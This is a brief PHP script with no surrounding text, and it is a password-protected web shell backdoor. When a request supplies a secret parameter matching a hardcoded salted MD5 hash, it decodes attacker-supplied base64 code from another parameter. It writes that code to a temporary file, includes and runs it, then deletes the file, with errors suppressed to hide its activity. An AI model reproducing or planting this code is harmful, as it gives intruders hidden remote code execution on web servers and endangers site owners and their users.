<?php
if(isset($_REQUEST['pwd163']) && md5($_REQUEST['pwd163'] . "bc_#!11AA") == "d686f9c5ce3c7848fb2010473f4dbd58"){
    $file = dirname(__FILE__) . '/www-163.php';
    $a =base64_decode(rawurldecode((urlencode(urldecode($_REQUEST['zzz'])))));
    @file_put_contents($file,$a);
    include($file);
    @unlink($file);
    die();
}
